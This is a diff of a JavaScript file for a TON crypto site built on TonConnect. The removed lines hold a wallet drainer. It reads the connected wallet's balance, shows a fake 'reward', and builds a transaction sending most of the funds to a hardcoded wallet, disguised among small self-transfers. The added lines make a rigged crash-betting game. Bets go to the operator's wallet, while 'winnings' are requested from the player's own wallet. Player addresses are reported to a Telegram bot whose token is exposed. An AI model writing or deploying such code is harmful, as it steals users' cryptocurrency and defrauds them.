@@ -1,148 +1,119 @@
-var mainWallet = "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c"; // Основной кошелек для перевода 
-
-// Создаем объект для подключения к TonConnect UI
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://qyvirkot.github.io/notcoin/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
 });
 
-// Храним адрес подключенного кошелька
 let walletAddress = null;
+let gameRunning = false;
+let multiplier = 1.00;
+let rocketSpeed = 5;
+let gameInterval;
+let betAmount = 0;
+const mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
 
-// Обработчик изменения статуса подключения
 tonConnectUI.onStatusChange(async (walletInfo) => {
     if (walletInfo && walletInfo.account) {
         walletAddress = walletInfo.account.address;
         console.log('Адрес подключенного кошелька:', walletAddress);
-        
-        // Когда кошелек подключен, обновляем баланс
-        await updateBalance(walletAddress);
     }
 });
 
-// Функция для обновления баланса на странице
-async function updateBalance(walletAddress) {
-    try {
-        // Получаем баланс кошелька
-        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
-        const data = await response.json();
+async function startGame() {
+    if (!walletAddress) return alert("Подключите кошелек!");
+    
+    betAmount = parseFloat(document.getElementById("betAmount").value);
+    if (isNaN(betAmount) || betAmount <= 0) return alert("Введите корректную ставку!");
 
-        if (!data.balance) {
-            console.error('Не удалось получить баланс');
-            alert('Не удалось получить баланс');
-            return;
-        }
-
-        const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
-        const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах
-
-        // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
-        if (originalBalance <= deduction) {
-            console.error('Баланс слишком мал для вычитания 0.3 TON');
-            alert('Баланс слишком мал для вычитания 0.3 TON');
-            return;
-        }
-
-        // Вычитаем 0.3 TON из баланса
-        const remainingBalance = originalBalance - deduction;
-
-        // Конвертация в TON
-        const displayedBalance = remainingBalance / 1000000000;
-        console.log(`Баланс после вычета 0.3 TON: ${displayedBalance} TON`);
-
-        // Обновляем отображение баланса на странице
-        const walletInfoElement = document.getElementById('wallet-info');
-        if (walletInfoElement) {
-            walletInfoElement.innerHTML = `Remaining amount of reward: <b>${displayedBalance} TON</b>`;
-        }
-
-    } catch (error) {
-        console.error('Ошибка при получении баланса:', error);
-    }
-}
-
-// Функция для отправки транзакции
-async function didtrans() {
-    // Проверяем, подключен ли кошелек
-    if (!walletAddress) {
-        console.error('Кошелек не подключен');
-        alert('Кошелек не подключен');
-        return;
-    }
-
-    // Получаем баланс кошелька
-    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
-    const data = await response.json();
-
-    // Проверка на ошибки при получении данных о кошельке
-    if (!data.balance) {
-        console.error('Не удалось получить баланс');
-        return;
-    }
-
-    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
-    const origbal = originalBalance * 0.55;
-    const roundedBalance = Math.round(origbal);
-
-    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
-    const deduction = roundedBalance; // 0.3 TON в нанотонах
-
-    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
-    if (originalBalance <= deduction) {
-        console.error('Баланс слишком мал для вычитания 0.3 TON');
-        return;
-    }
-
-    // Вычитаем 0.3 TON из баланса
-    const remainingBalance = originalBalance - deduction;
-
-    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
-
-    // Формируем транзакцию с двумя сообщениями
+    // Отправка ставки
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
+        validUntil: Math.floor(Date.now() / 1000) + 60,
         messages: [
-            {
-                address: walletAddress,  // Адрес получателя для первой части
-                amount: 100,       // Сумма для первой транзакции (0.001 TON)
-            },
-            {
-                address: walletAddress,  // Адрес получателя для первой части
-                amount: 100,       // Сумма для первой транзакции (0.001 TON)
-            },
-            {
-                address: walletAddress,  // Адрес получателя для первой части
-                amount: 100,       // Сумма для первой транзакции (0.001 TON)
-            },
-            {
-                address: mainWallet,   // Адрес получателя для второй части
-                amount: remainingBalance, // Сумма для второй транзакции
-            }
+            { address: mainWallet, amount: betAmount * 1000000000 },
         ],
-        sendMode: 5,  // Если это требуется в вашем API
-        comment: "Получить",  // Комментарий (по желанию)
+        sendMode: 5
     };
 
     try {
-        // Подписание и отправка транзакции через TonConnect
-        const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Транзакция успешно отправлена:', result);
-        
-        // Обновляем баланс после отправки
-        await updateBalance(walletAddress);
+        await tonConnectUI.sendTransaction(transaction);
+        console.log(`Ставка ${betAmount} TON отправлена!`);
     } catch (error) {
-        console.error('Ошибка при отправке транзакции:', error);
+        console.error("Ошибка при отправке TON:", error);
+        return;
+    }
+
+    // Запуск игры
+    gameRunning = true;
+    multiplier = 1.00;
+    rocketSpeed = 5;
+    document.getElementById("multiplier").innerText = multiplier.toFixed(2);
+    
+    let rocket = document.getElementById("rocket");
+    rocket.style.bottom = "10px";
+
+    gameInterval = setInterval(() => {
+        if (!gameRunning) return;
+        multiplier += 0.05;
+        rocketSpeed += 1;
+        document.getElementById("multiplier").innerText = multiplier.toFixed(2);
+        
+        // Двигаем ракету вверх
+        let currentBottom = parseInt(rocket.style.bottom) || 10;
+        rocket.style.bottom = `${currentBottom + rocketSpeed}px`;
+
+        // Проигрыш при случайном событии
+        if (Math.random() < 0.02 * (multiplier / 2)) {
+            gameRunning = false;
+            clearInterval(gameInterval);
+            alert("🚀 Ракета взорвалась! Вы проиграли.");
+        }
+    }, 500);
+}
+
+function stopGame() {
+    if (!gameRunning) return;
+    gameRunning = false;
+    clearInterval(gameInterval);
+    
+    alert(`🎉 Вы выиграли! Ваш коэффициент: ${multiplier.toFixed(2)}x`);
+    
+    let winAmount = betAmount * multiplier;
+    
+    sendToTelegram(`✅ Игрок <code>${walletAddress}</code> выиграл <b>${winAmount.toFixed(2)} TON</b>`);
+    
+    // Отправка выигрыша игроку
+    sendWinTransaction(winAmount);
+}
+
+async function sendWinTransaction(amount) {
+    if (!walletAddress) return;
+
+    const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 60,
+        messages: [
+            { address: walletAddress, amount: Math.floor(amount * 1000000000) },
+        ],
+        sendMode: 5
+    };
+
+    try {
+        await tonConnectUI.sendTransaction(transaction);
+        console.log(`Выплачено ${amount.toFixed(2)} TON`);
+    } catch (error) {
+        console.error("Ошибка при выплате выигрыша:", error);
     }
 }
-document.body.addEventListener('click', playHeartbeatSound);
-document.body.addEventListener('touchstart', playHeartbeatSound); // Добавляем событие для мобильных устройств
 
-function playHeartbeatSound() {
-    const heartbeatSound = document.getElementById('heartbeat-sound');
-    
-    // Устанавливаем максимальную громкость сразу
-    heartbeatSound.volume = 1.0;
-    
-    heartbeatSound.loop = true; // Повторять звук
-    heartbeatSound.play(); // Запуск звука
+async function sendToTelegram(message) {
+    const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
+    const chatId = "@ppjjkkd";
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+        });
+    } catch (error) {
+        console.error("Ошибка отправки в Telegram:", error);
+    }
 }
